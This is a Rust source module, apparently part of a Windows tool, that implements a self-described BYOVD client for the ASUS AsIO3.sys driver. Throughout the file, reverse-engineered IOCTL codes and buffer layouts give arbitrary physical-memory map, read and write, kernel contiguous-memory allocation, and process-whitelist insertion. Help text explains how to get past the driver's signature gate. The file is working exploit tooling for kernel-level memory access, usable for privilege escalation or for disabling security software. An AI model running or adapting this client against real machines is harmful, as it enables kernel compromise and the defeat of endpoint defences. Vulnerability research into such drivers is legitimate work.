//! AsIO3.sys BYOVD client — physical memory read/write via `\\.\Asusgio3`.
//!
//! IOCTL layouts derived from static analysis of AsIO3.sys (ASUSTeK).
//!
//! **CREATE gate:** the driver accepts `CreateFile` only when the caller passes
//! `AsIO3_VerifyAsusCert` (PE signed with the embedded ASUS SHA256) **or** the
//! process PID is already in the driver whitelist (`IOCTL 0xA040A490`).

use std::ffi::{OsStr, c_void};
use std::mem::{size_of, zeroed};
use std::os::windows::ffi::OsStrExt;

use anyhow::{Context, bail};
use clap::Subcommand;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::IO::DeviceIoControl;
use windows::core::PCWSTR;

pub(crate) const ASIO3_DEVICE_PATH: &str = r"\\.\Asusgio3";

const GENERIC_READ: u32 = 0x8000_0000;
const GENERIC_WRITE: u32 = 0x4000_0000;

/// Minimum buffer size for phys read/write/map IOCTLs (`AsIO3_PhysMem*`).
const PHYS_BUF_SIZE: usize = 0x1028;

/// `IOCTL 0xA0402450` — map `\Device\PhysicalMemory` (40-byte buffer).
const IOCTL_MAP_PHYSICAL: u32 = 0xA040_2450;
/// `IOCTL 0xA0400F7C` — read 1/2/4 bytes from physical memory.
const IOCTL_PHYS_READ: u32 = 0xA040_0F7C;
/// `IOCTL 0xA0400F80` — write 1/2/4 bytes to physical memory.
const IOCTL_PHYS_WRITE: u32 = 0xA040_0F80;
/// `IOCTL 0xA0400F84` — read up to one 4 KiB page.
const IOCTL_PHYS_READ_PAGE: u32 = 0xA040_0F84;
/// `IOCTL 0xA040200C` — map phys into caller user VA (`AsIO3_PhysMemMap`, mapping persists).
const IOCTL_PHYS_MEM_MAP: u32 = 0xA040_200C;
/// `IOCTL 0xA0402010` — unmap a view from [`AsIO3Client::phys_mem_map`].
const IOCTL_PHYS_MEM_UNMAP: u32 = 0xA040_2010;
/// `IOCTL 0xA040A490` — add a PID to the driver process whitelist.
const IOCTL_ADD_WHITELIST: u32 = 0xA040_A490;
/// `IOCTL 0xA040A488` — `MmAllocateContiguousMemory` + register in physmem allow-list (8-byte buffer).
const IOCTL_ALLOC_CONTIGUOUS: u32 = 0xA040_A488;
/// `IOCTL 0xA0400F90` — raw `MmAllocateContiguousMemory` (4136-byte buffer, **not** physmem-whitelisted).
const IOCTL_ALLOC_CONTIGUOUS_RAW: u32 = 0xA040_0F90;
/// `IOCTL 0xA0400F94` — `MmFreeContiguousMemory` (4136-byte buffer, pairs with `--raw` alloc).
const IOCTL_FREE_CONTIGUOUS: u32 = 0xA040_0F94;
/// Max size accepted by `IOCTL 0xA040A488`.
const ALLOC_CONTIGUOUS488_MAX: u32 = 0x0800_0000;
/// `AsIO3_MapPhysMemPage` always checks/maps one 4 KiB page (`AsIO3_PhysMemRead`).
const PHYS_MAP_PAGE_SIZE: u32 = 0x1000;

/// Default physical addresses inside the static allow-list (`unk_140009130`).
pub(crate) const DEFAULT_PHYS_LEGACY: u64 = 0x000E_0000;
pub(crate) const DEFAULT_PHYS_MMIO: u64 = 0xF800_0000;

/// 40-byte in/out buffer for `IOCTL_MAP_PHYSICAL`.
#[repr(C)]
#[derive(Clone, Copy, Debug, Default)]
struct MapPhysBuffer {
    map_size: u64,
    physical: u64,
    out_a: u64,
    out_b: u64,
    out_object: u64,
}

/// 4136-byte buffer for `AsIO3_PhysMemRead` / `AsIO3_PhysMemWrite`.
#[repr(C)]
#[derive(Clone, Copy)]
struct PhysOpBuffer {
    width: u8,
    byte_val: u8,
    word_val: u16,
    dword_val: u32,
    section_handle: u64,
    map_size: u32,
    phys_lo: u32,
    physical: u64,
    mapped_va: u64,
    _rest: [u8; PHYS_BUF_SIZE - 40],
}

impl Default for PhysOpBuffer {
    fn default() -> Self {
        unsafe { zeroed() }
    }
}

/// 8-byte in/out buffer for `IOCTL 0xA040A488`.
///
/// IDA @ `0x1400025a5`: driver writes `mov [r12], rax` where
/// `rax = [phys_lo: u32][kernel_va_lo: u32]` — both at buffer offset 0.
#[repr(C)]
#[derive(Clone, Copy, Default)]
struct ContigAlloc488Buffer {
    /// in: allocation size; out: `MmGetPhysicalAddress().LowPart`
    phys_or_size: u32,
    /// out: `(u32)kernel_va` (driver truncates pointer on x64)
    kernel_va_lo: u32,
}

/// Result of `IOCTL 0xA0402450`.
#[derive(Clone, Copy, Debug)]
pub(crate) struct MapResult {
    pub physical: u64,
    pub map_size: u64,
    pub kernel_va: u64,
}

/// Result of `IOCTL 0xA040200C` (`AsIO3_PhysMemMap`).
#[derive(Clone, Copy, Debug)]
pub(crate) struct PhysMemMapResult {
    pub physical: u64,
    pub map_size: u32,
    /// User-mode VA in the calling process (buffer `@0x20`).
    pub mapped_va: u64,
    /// Section handle for `phys-unmap` (buffer `@0x08`).
    pub section_handle: u64,
}

/// Result of `IOCTL 0xA040A488` / `0xA0400F90`.
#[derive(Clone, Copy, Debug)]
pub(crate) struct ContigAllocResult {
    pub size: u32,
    pub physical: u64,
    pub kernel_va: u64,
    /// True when allocated via `0xA0400F90` (`--raw`); phys read/write need `0xA040A488` instead.
    pub raw: bool,
}

pub(crate) struct AsIO3Client {
    handle: HANDLE,
}

/// Reusable AsIO3 device session — keeps `CreateFile` handle open across shell commands.
///
/// AsIO3 removes the caller PID from the process whitelist on `IRP_MJ_CLOSE`, so closing
/// the handle after every subcommand breaks subsequent `CreateFile` calls in shell mode.
pub(crate) struct AsIO3Session {
    path: String,
    client: Option<AsIO3Client>,
    /// Upper 32 bits of `MmAllocateContiguousMemory` VAs on this boot (probed via `0xF90`).
    kernel_va_hi: Option<u32>,
}

impl AsIO3Session {
    pub(crate) fn new(path: impl Into<String>) -> Self {
        Self {
            path: path.into(),
            client: None,
            kernel_va_hi: None,
        }
    }

    pub(crate) fn set_path(&mut self, path: impl AsRef<str>) {
        let path = path.as_ref();
        if self.path != path {
            self.client = None;
            self.kernel_va_hi = None;
            self.path = path.to_owned();
        }
    }

    /// `0xA040A488` only returns `(u32)kernel_va`; probe once via `0xF90` for the upper half.
    fn kernel_va_hi(&mut self) -> anyhow::Result<u32> {
        if let Some(hi) = self.kernel_va_hi {
            return Ok(hi);
        }
        let client = self.ensure_client()?;
        let probe = client.alloc_contiguous_raw(PHYS_MAP_PAGE_SIZE)?;
        let hi = (probe.kernel_va >> 32) as u32;
        client.free_contiguous(probe.kernel_va)?;
        self.kernel_va_hi = Some(hi);
        Ok(hi)
    }

    fn reconstruct_kernel_va(&mut self, lo: u32) -> anyhow::Result<u64> {
        let hi = self.kernel_va_hi()?;
        Ok((u64::from(hi) << 32) | u64::from(lo))
    }

    fn ensure_client(&mut self) -> anyhow::Result<&mut AsIO3Client> {
        if self.client.is_none() {
            println!("opening: {}", self.path);
            self.client = Some(AsIO3Client::open(&self.path)?);
        }
        Ok(self.client.as_mut().expect("client just opened"))
    }

    pub(crate) fn run(&mut self, action: AsIO3Action) -> anyhow::Result<()> {
        match action {
            AsIO3Action::Info => run_asio3_info(&self.path),
            AsIO3Action::Open => {
                print_open_notes();
                let _client = self.ensure_client()?;
                println!("CreateFile OK — CREATE gate passed for pid {}", std::process::id());
                println!("device handle kept open for this session");
                Ok(())
            }
            other => {
                match other {
                    AsIO3Action::AllocContig { size, raw } => {
                        let client = self.ensure_client()?;
                        let size = parse_size(&size)? as u32;
                        let mut result = client.alloc_contiguous(size, raw)?;
                        if !result.raw {
                            let lo = result.kernel_va as u32;
                            result.kernel_va = self.reconstruct_kernel_va(lo)?;
                        }
                        print_alloc_contig_result(&result);
                        Ok(())
                    }
                    action => {
                        let client = self.ensure_client()?;
                        dispatch_asio3_action(client, action)
                    }
                }
            }
        }
    }
}

impl AsIO3Client {
    pub(crate) fn open(path: &str) -> anyhow::Result<Self> {
        let wide = to_wide(path);
        let handle = unsafe {
            CreateFileW(
                PCWSTR(wide.as_ptr()),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )
        }
        .with_context(|| {
            format!(
                "CreateFileW failed for {path} (is AsIO3.sys loaded? \
                 CREATE requires ASUS-signed PE or process whitelist — see `asio3 open` notes)"
            )
        })?;
        Ok(Self { handle })
    }

    /// Add `pid` to the driver whitelist (`IOCTL 0xA040A490`).
    pub(crate) fn add_whitelist(&self, pid: u32) -> anyhow::Result<()> {
        let mut pid_buf = pid;
        let mut returned = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_ADD_WHITELIST,
                Some(std::ptr::from_mut(&mut pid_buf).cast::<c_void>()),
                size_of::<u32>() as u32,
                None,
                0,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }
        println!("whitelisted pid {pid}");
        Ok(())
    }

    /// Map physical memory via `\Device\PhysicalMemory` (`IOCTL 0xA0402450`).
    pub(crate) fn map_physical(&self, physical: u64, size: u64) -> anyhow::Result<MapResult> {
        if size == 0 {
            bail!("map size must be > 0");
        }

        let mut buf = MapPhysBuffer {
            map_size: size,
            physical,
            ..Default::default()
        };
        let mut returned = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_MAP_PHYSICAL,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                size_of::<MapPhysBuffer>() as u32,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                size_of::<MapPhysBuffer>() as u32,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }
        if returned as usize != size_of::<MapPhysBuffer>() {
            bail!("IOCTL_MAP_PHYSICAL returned {returned} bytes");
        }

        Ok(MapResult {
            physical: buf.physical,
            map_size: buf.map_size,
            kernel_va: buf.out_a,
        })
    }

    /// Map physical memory into the **calling process** user VA (`IOCTL 0xA040200C`).
    ///
    /// Unlike [`Self::phys_read_raw`], the mapping stays active until [`Self::phys_mem_unmap`].
    /// `map_size` is passed to `AsIO3_CheckPhysMemAllowed` (default / rounded to one 4 KiB page).
    pub(crate) fn phys_mem_map(&self, physical: u64, map_size: u32) -> anyhow::Result<PhysMemMapResult> {
        let map_size = if map_size == 0 {
            PHYS_MAP_PAGE_SIZE
        } else {
            round_up_page(map_size)
        };

        let mut buf = PhysOpBuffer::default();
        buf.map_size = map_size;
        buf.physical = physical;

        let mut returned = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_MEM_MAP,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }

        if buf.mapped_va == 0 {
            bail!(
                "IOCTL 0xA040200C failed (phys={physical:#x} size={map_size}); \
                 mapped_va=0 — check phys allow-list"
            );
        }

        Ok(PhysMemMapResult {
            physical: buf.physical,
            map_size,
            mapped_va: buf.mapped_va,
            section_handle: buf.section_handle,
        })
    }

    /// Unmap a view created by [`Self::phys_mem_map`] (`IOCTL 0xA0402010`).
    pub(crate) fn phys_mem_unmap(&self, section_handle: u64, mapped_va: u64) -> anyhow::Result<()> {
        if section_handle == 0 || mapped_va == 0 {
            bail!("section handle and mapped VA must be non-zero");
        }

        let mut buf = PhysOpBuffer::default();
        buf.section_handle = section_handle;
        buf.mapped_va = mapped_va;

        let mut returned = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_MEM_UNMAP,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                None,
                0,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }
        Ok(())
    }

    pub(crate) fn phys_read_raw(&self, physical: u64, width: u8) -> anyhow::Result<u32> {
        if !matches!(width, 1 | 2 | 4) {
            bail!("width must be 1, 2, or 4");
        }

        let mut buf = PhysOpBuffer::default();
        buf.width = width;
        buf.map_size = 0x1000;
        buf.physical = physical;

        let mut returned = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_READ,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }

        Ok(match width {
            1 => u32::from(buf.byte_val),
            2 => u32::from(buf.word_val),
            _ => buf.dword_val,
        })
    }

    fn phys_write_raw(&self, physical: u64, width: u8, value: u32) -> anyhow::Result<()> {
        if !matches!(width, 1 | 2 | 4) {
            bail!("width must be 1, 2, or 4");
        }

        let mut buf = PhysOpBuffer::default();
        buf.width = width;
        buf.map_size = 0x1000;
        buf.physical = physical;
        match width {
            1 => buf.byte_val = value as u8,
            2 => buf.word_val = value as u16,
            _ => buf.dword_val = value,
        }

        let mut returned = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_PHYS_WRITE,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }
        Ok(())
    }

    /// Read `size` bytes starting at `physical` (uses dword/ word/ byte reads).
    pub(crate) fn read_physical(&self, physical: u64, size: usize) -> anyhow::Result<Vec<u8>> {
        if size == 0 {
            bail!("size must be > 0");
        }

        let mut out = Vec::with_capacity(size);
        let mut addr = physical;
        while out.len() < size {
            let remaining = size - out.len();
            let page_off = (addr & 0xFFF) as usize;

            if remaining >= 4 && addr % 4 == 0 {
                let v = self.phys_read_raw(addr, 4)?;
                let chunk = v.to_le_bytes();
                let take = remaining.min(4);
                out.extend_from_slice(&chunk[..take]);
                addr += take as u64;
            } else if remaining >= 2 && addr % 2 == 0 && page_off <= 0xFFE {
                let v = self.phys_read_raw(addr, 2)?;
                let chunk = v.to_le_bytes();
                let take = remaining.min(2);
                out.extend_from_slice(&chunk[..take]);
                addr += take as u64;
            } else {
                let v = self.phys_read_raw(addr, 1)?;
                out.push(v as u8);
                addr += 1;
            }
        }
        Ok(out)
    }

    /// Allocate kernel contiguous memory (`IOCTL 0xA040A488` by default).
    ///
    /// `0xA040A488` calls `MmAllocateContiguousMemory` and inserts `[phys, phys+size)` into
    /// the driver dynamic physmem list (`qword_140009470`), so subsequent `read`/`write` work.
    ///
    /// `0xA0400F90` (`raw = true`) returns full 64-bit `kernel_va` for `free-contig`, but the
    /// range is **not** registered — phys read/write return `ACCESS_DENIED`.
    pub(crate) fn alloc_contiguous(&self, size: u32, raw: bool) -> anyhow::Result<ContigAllocResult> {
        if size == 0 {
            bail!("allocation size must be > 0");
        }
        if raw {
            return self.alloc_contiguous_raw(size);
        }
        if size > ALLOC_CONTIGUOUS488_MAX {
            bail!(
                "IOCTL 0xA040A488 max size is {ALLOC_CONTIGUOUS488_MAX:#x}; use --raw for larger allocs"
            );
        }

        // Driver registers [phys, phys+size) but phys read/write always map/check 0x1000 bytes
        // (AsIO3_PhysMemRead → AsIO3_MapPhysMemPage(..., 0x1000)). Partial overlap is rejected.
        let requested = size;
        let size = round_up_page(size);
        if size != requested {
            println!(
                "note: rounded alloc {requested} → {size} bytes (phys read/write maps one {PHYS_MAP_PAGE_SIZE}-byte page)"
            );
        }

        let mut buf = ContigAlloc488Buffer {
            phys_or_size: size,
            kernel_va_lo: 0,
        };
        let mut returned = 0u32;
        let buf_size = size_of::<ContigAlloc488Buffer>() as u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_ALLOC_CONTIGUOUS,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                buf_size,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                buf_size,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }
        if returned < size_of::<u64>() as u32 {
            bail!("IOCTL 0xA040A488 returned {returned} bytes (expected 8)");
        }

        let physical = u64::from(buf.phys_or_size);
        let kernel_va_lo = u64::from(buf.kernel_va_lo);
        if physical == 0 {
            bail!(
                "MmAllocateContiguousMemory failed for size {size} \
                 (driver buf: phys={physical:#x} kernel_va_lo={kernel_va_lo:#x})"
            );
        }

        Ok(ContigAllocResult {
            size,
            physical,
            kernel_va: kernel_va_lo,
            raw: false,
        })
    }

    fn alloc_contiguous_raw(&self, size: u32) -> anyhow::Result<ContigAllocResult> {
        let mut buf = PhysOpBuffer::default();
        buf.map_size = size;

        let mut returned = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_ALLOC_CONTIGUOUS_RAW,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }

        if buf.mapped_va == 0 {
            bail!("MmAllocateContiguousMemory returned NULL for size {size}");
        }

        Ok(ContigAllocResult {
            size,
            physical: buf.physical,
            kernel_va: buf.mapped_va,
            raw: true,
        })
    }

    /// Free kernel contiguous memory via `MmFreeContiguousMemory` (`IOCTL 0xA0400F94`).
    ///
    /// Expects the kernel VA previously returned by [`Self::alloc_contiguous`] at buffer `@0x20`.
    pub(crate) fn free_contiguous(&self, kernel_va: u64) -> anyhow::Result<()> {
        if kernel_va == 0 {
            bail!("kernel_va must be non-zero");
        }

        let mut buf = PhysOpBuffer::default();
        buf.mapped_va = kernel_va;

        let mut returned = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_FREE_CONTIGUOUS,
                Some(std::ptr::from_mut(&mut buf).cast::<c_void>()),
                PHYS_BUF_SIZE as u32,
                None,
                0,
                Some(std::ptr::from_mut(&mut returned)),
                None,
            )?;
        }
        Ok(())
    }

    /// Write raw bytes to consecutive physical addresses.
    pub(crate) fn write_physical(&self, physical: u64, data: &[u8]) -> anyhow::Result<()> {
        let mut addr = physical;
        let mut pos = 0usize;
        while pos < data.len() {
            let remaining = data.len() - pos;
            if remaining >= 4 && addr % 4 == 0 && (addr & 0xFFF) <= 0xFFC {
                let mut chunk = [0u8; 4];
                chunk.copy_from_slice(&data[pos..pos + 4]);
                self.phys_write_raw(addr, 4, u32::from_le_bytes(chunk))?;
                pos += 4;
                addr += 4;
            } else if remaining >= 2 && addr % 2 == 0 && (addr & 0xFFF) <= 0xFFE {
                let mut chunk = [0u8; 2];
                chunk.copy_from_slice(&data[pos..pos + 2]);
                self.phys_write_raw(addr, 2, u16::from_le_bytes(chunk) as u32)?;
                pos += 2;
                addr += 2;
            } else {
                self.phys_write_raw(addr, 1, u32::from(data[pos]))?;
                pos += 1;
                addr += 1;
            }
        }
        Ok(())
    }
}

impl Drop for AsIO3Client {
    fn drop(&mut self) {
        unsafe {
            let _unused = windows::Win32::Foundation::CloseHandle(self.handle);
        }
    }
}

fn to_wide(path: &str) -> Vec<u16> {
    OsStr::new(path).encode_wide().chain(Some(0)).collect()
}

fn round_up_page(size: u32) -> u32 {
    (size + PHYS_MAP_PAGE_SIZE - 1) & !(PHYS_MAP_PAGE_SIZE - 1)
}

fn parse_address(input: &str) -> anyhow::Result<u64> {
    let trimmed = input.trim();
    let trimmed = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
        .unwrap_or(trimmed);
    u64::from_str_radix(trimmed, 16).with_context(|| format!("invalid address: {input}"))
}

/// Parse byte counts: decimal by default (`4096`), hex with `0x` prefix (`0x1000`).
fn parse_size(input: &str) -> anyhow::Result<u64> {
    let trimmed = input.trim();
    if let Some(hex) = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
    {
        u64::from_str_radix(hex, 16).with_context(|| format!("invalid size: {input}"))
    } else {
        trimmed
            .parse::<u64>()
            .with_context(|| format!("invalid size: {input}"))
    }
}

fn print_hex_dump(base: u64, data: &[u8]) {
    for (i, chunk) in data.chunks(16).enumerate() {
        let addr = base + (i * 16) as u64;
        print!("{addr:016x}  ");
        for (j, byte) in chunk.iter().enumerate() {
            if j == 8 {
                print!(" ");
            }
            print!("{byte:02x} ");
        }
        let pad = (16 - chunk.len()) * 3 + if chunk.len() <= 8 { 1 } else { 0 };
        for _ in 0..pad {
            print!("   ");
        }
        print!(" |");
        for byte in chunk {
            let c = if byte.is_ascii_graphic() || *byte == b' ' {
                *byte as char
            } else {
                '.'
            };
            print!("{c}");
        }
        println!("|");
    }
}

fn print_open_notes() {
    println!("AsIO3 CREATE gate — open succeeds only when:");
    println!("  1. The *executable file* (ProcessImageFileName) has a matching ASUS PE SHA256, or");
    println!("  2. Caller PID is in the driver whitelist (IOCTL 0xA040A490).");
    println!();
    println!("NOTE: the driver checks the .exe path, NOT your cmd current directory.");
    println!("  Running `cd ...\\\\AsusCertService\\\\1.2.41` then invoking an unsigned");
    println!("  win_hv_client.exe from elsewhere does NOT satisfy the gate.");
    println!();
    println!("Typical workflow:");
    println!("  a) Run a genuine ASUS-signed .exe that passes the embedded hash check, or");
    println!("  b) Have an already-authorized process call `whitelist --pid <your-pid>`.");
    println!();
    println!("Static physmem allow-list includes:");
    println!("  {DEFAULT_PHYS_LEGACY:#x}..{:#x}  (legacy BIOS)", DEFAULT_PHYS_LEGACY + 0x2_0000);
    println!("  {DEFAULT_PHYS_MMIO:#x}..{:#x}  (MMIO window)", DEFAULT_PHYS_MMIO + 0x07FF_FFFF);
}

#[derive(Subcommand)]
pub(crate) enum AsIO3Action {
    /// Show device path, IOCTL codes, and CREATE gate notes.
    Info,
    /// Try opening the device (validates CREATE gate).
    Open,
    /// Add a PID to the driver process whitelist.
    Whitelist {
        /// Process ID to whitelist (default: current process).
        #[arg(long)]
        pid: Option<u32>,
    },
    /// Map physical memory (`IOCTL 0xA0402450`, 40-byte buffer).
    Map {
        address: String,
        #[arg(long, default_value = "4096")]
        size: String,
    },
    /// Map phys into user VA — persists until `phys-unmap` (`IOCTL 0xA040200C`).
    PhysMap {
        address: String,
        #[arg(long, default_value = "4096")]
        size: String,
    },
    /// Unmap a prior `phys-map` view (`IOCTL 0xA0402010`).
    PhysUnmap {
        /// Section handle from `phys-map` output.
        #[arg(long)]
        handle: String,
        /// User VA from `phys-map` output.
        #[arg(long)]
        va: String,
    },
    /// Read bytes from physical memory.
    Read {
        address: String,
        #[arg(short, long, default_value_t = 64)]
        size: u32,
        /// Access width hint: auto (default), 1, 2, or 4.
        #[arg(long, default_value = "auto")]
        width: String,
    },
    /// Write hex bytes to physical memory.
    Write {
        address: String,
        #[arg(long)]
        hex: String,
    },
    /// Map (optional) and dump physical memory.
    Dump {
        address: String,
        #[arg(short, long, default_value_t = 256)]
        size: u32,
    },
    /// Allocate kernel contiguous memory (`IOCTL 0xA040A488`, physmem-whitelisted).
    AllocContig {
        /// Number of bytes to allocate.
        #[arg(long)]
        size: String,
        /// Use `IOCTL 0xA0400F90` instead (full kernel_va for free, but no phys read/write).
        #[arg(long)]
        raw: bool,
    },
    /// Free kernel contiguous memory (`IOCTL 0xA0400F94`, `MmFreeContiguousMemory`).
    FreeContig {
        /// Kernel virtual address returned by `alloc-contig` (buffer `@0x20`).
        kernel_va: String,
    },
}

pub(crate) fn run_asio3(device: Option<&str>, action: AsIO3Action) -> anyhow::Result<()> {
    let mut session = AsIO3Session::new(device.unwrap_or(ASIO3_DEVICE_PATH));
    session.run(action)
}

fn run_asio3_info(path: &str) -> anyhow::Result<()> {
    println!("device:           {path}");
    println!("map IOCTL:        {IOCTL_MAP_PHYSICAL:#010x}");
    println!("phys read IOCTL:  {IOCTL_PHYS_READ:#010x}");
    println!("phys write IOCTL: {IOCTL_PHYS_WRITE:#010x}");
    println!("read page IOCTL:  {IOCTL_PHYS_READ_PAGE:#010x}");
    println!("phys map IOCTL:   {IOCTL_PHYS_MEM_MAP:#010x} (user VA, persists until unmap)");
    println!("phys unmap IOCTL: {IOCTL_PHYS_MEM_UNMAP:#010x}");
    println!("whitelist IOCTL:  {IOCTL_ADD_WHITELIST:#010x}");
            println!("alloc contig IOCTL: {IOCTL_ALLOC_CONTIGUOUS:#010x} (default, physmem-whitelisted)");
            println!("alloc raw IOCTL:    {IOCTL_ALLOC_CONTIGUOUS_RAW:#010x} (--raw, full kernel_va)");
            println!("free contig IOCTL:  {IOCTL_FREE_CONTIGUOUS:#010x} (--raw alloc only)");
            println!("phys buffer size: {PHYS_BUF_SIZE:#x} ({PHYS_BUF_SIZE} bytes)");
            println!();
            println!("contiguous alloc (default `0xA040A488`, 8-byte buffer):");
            println!("  in/out @0: u32 size → u32 physical_lo");
            println!("  out @4:  u32 kernel_va_lo (upper 32 bits probed via one-time 0xF90)");
            println!("  → range registered in driver physmem list → read/write OK");
            println!("  → alloc size rounded up to {PHYS_MAP_PAGE_SIZE} bytes minimum (driver maps one page)");
            println!();
            println!("contiguous alloc --raw (`0xA0400F90`, 4136-byte buffer):");
            println!("  in/out @0x10: size, @0x18: physical, @0x20: full kernel_va");
            println!("  → NOT registered → phys read/write return ACCESS_DENIED");
            println!("  → use `free-contig` with full kernel_va");
            println!();
            println!("phys-map (`0xA040200C`, 4136-byte buffer):");
            println!("  in @0x10: map_size, @0x18: physical");
            println!("  out @0x08: section_handle, @0x20: mapped user VA");
            println!("  → use `phys-unmap --handle ... --va ...` when done");
    println!();
    print_open_notes();
    Ok(())
}

fn print_alloc_contig_result(result: &ContigAllocResult) {
    println!("allocated {:#x} bytes contiguous kernel memory", result.size);
    println!("physical:  {:#x}", result.physical);
    if result.raw {
        println!("kernel_va: {:#x} (raw / 0xF90 — use with free-contig)", result.kernel_va);
        println!("note: phys read/write blocked until range is whitelisted; omit --raw for read/write");
    } else {
        println!("kernel_va: {:#x}", result.kernel_va);
        println!(
            "tip: `asio3 write {:#x} --hex ...` / `asio3 read {:#x}`",
            result.physical, result.physical
        );
    }
}

fn dispatch_asio3_action(client: &AsIO3Client, action: AsIO3Action) -> anyhow::Result<()> {
    match action {
        AsIO3Action::Whitelist { pid } => {
            let pid = pid.unwrap_or_else(std::process::id);
            client.add_whitelist(pid)
        }
        AsIO3Action::Map { address, size } => {
            let phys = parse_address(&address)?;
            let size = parse_size(&size)?;
            let result = client.map_physical(phys, size)?;
            println!(
                "mapped {:#x}..{:#x}",
                result.physical,
                result.physical + result.map_size
            );
            println!("kernel_va: {:#x}", result.kernel_va);
            Ok(())
        }
        AsIO3Action::PhysMap { address, size } => {
            let phys = parse_address(&address)?;
            let size = parse_size(&size)? as u32;
            let result = client.phys_mem_map(phys, size)?;
            println!(
                "phys-map {:#x}..{:#x} ({:#x} bytes)",
                result.physical,
                result.physical + u64::from(result.map_size),
                result.map_size
            );
            println!("mapped_va:       {:#x}", result.mapped_va);
            println!("section_handle:  {:#x}", result.section_handle);
            println!("tip: read/write via mapped_va in-process, then:");
            println!(
                "  asio3 phys-unmap --handle {:#x} --va {:#x}",
                result.section_handle, result.mapped_va
            );
            Ok(())
        }
        AsIO3Action::PhysUnmap { handle, va } => {
            let handle = parse_address(&handle)?;
            let va = parse_address(&va)?;
            client.phys_mem_unmap(handle, va)?;
            println!("unmapped user view {va:#x} (handle {handle:#x})");
            Ok(())
        }
        AsIO3Action::Read { address, size, width } => {
            let phys = parse_address(&address)?;
            let size = size as usize;
            if size == 0 {
                bail!("size must be > 0");
            }
            let data = match width.as_str() {
                "auto" => client.read_physical(phys, size)?,
                "1" => {
                    let mut v = Vec::with_capacity(size);
                    for i in 0..size {
                        v.push(client.phys_read_raw(phys + i as u64, 1)? as u8);
                    }
                    v
                }
                "2" => {
                    if size % 2 != 0 || phys % 2 != 0 {
                        bail!("width=2 requires even address and size");
                    }
                    let mut v = Vec::with_capacity(size);
                    for i in (0..size).step_by(2) {
                        v.extend_from_slice(&client.phys_read_raw(phys + i as u64, 2)?.to_le_bytes());
                    }
                    v
                }
                "4" => {
                    if size % 4 != 0 || phys % 4 != 0 {
                        bail!("width=4 requires 4-byte aligned address and size");
                    }
                    let mut v = Vec::with_capacity(size);
                    for i in (0..size).step_by(4) {
                        v.extend_from_slice(&client.phys_read_raw(phys + i as u64, 4)?.to_le_bytes());
                    }
                    v
                }
                other => bail!("unknown width {other:?}; use auto, 1, 2, or 4"),
            };
            println!("read {} bytes from {phys:#x}:", data.len());
            println!("{}", hex::encode(&data));
            Ok(())
        }
        AsIO3Action::Write { address, hex } => {
            let phys = parse_address(&address)?;
            let data = hex::decode(hex.replace(' ', "")).context("invalid hex payload")?;
            client.write_physical(phys, &data)?;
            println!("wrote {} bytes to {phys:#x}", data.len());
            Ok(())
        }
        AsIO3Action::Dump { address, size } => {
            let phys = parse_address(&address)?;
            let size = size as usize;
            if size == 0 {
                bail!("size must be > 0");
            }
            let data = client.read_physical(phys, size)?;
            println!("dump {size} bytes from physical {phys:#x}:");
            print_hex_dump(phys, &data);
            Ok(())
        }
        AsIO3Action::AllocContig { .. } => unreachable!("handled in AsIO3Session::run"),
        AsIO3Action::FreeContig { kernel_va } => {
            let kernel_va = parse_address(&kernel_va)?;
            client.free_contiguous(kernel_va)?;
            println!("freed contiguous kernel memory at {kernel_va:#x}");
            Ok(())
        }
        AsIO3Action::Info | AsIO3Action::Open => unreachable!(),
    }
}
